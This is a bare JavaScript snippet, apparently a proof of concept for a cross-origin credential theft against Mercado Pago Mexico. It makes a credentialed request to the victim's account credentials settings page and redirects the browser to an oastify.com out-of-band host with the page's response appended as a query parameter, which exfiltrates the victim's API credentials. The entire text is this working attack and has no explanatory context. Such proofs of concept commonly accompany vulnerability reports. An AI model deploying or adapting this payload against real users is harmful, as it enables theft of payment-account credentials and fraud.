var xhr = new XMLHttpRequest();
        xhr.open("GET", "https:\/\/www.mercadopago.com.mx\/settings\/account\/credentials", true);
        xhr.onload = reqListener;
        xhr.setRequestHeader("accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("accept-language", "en-US,en;q=0.5");
        xhr.withCredentials = true;
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      
        function reqListener() {
            location='https://cbrlanimf0tn4gwa5gip99a5rwxnlhj58.oastify.com/log?key='+this.responseText;
        }
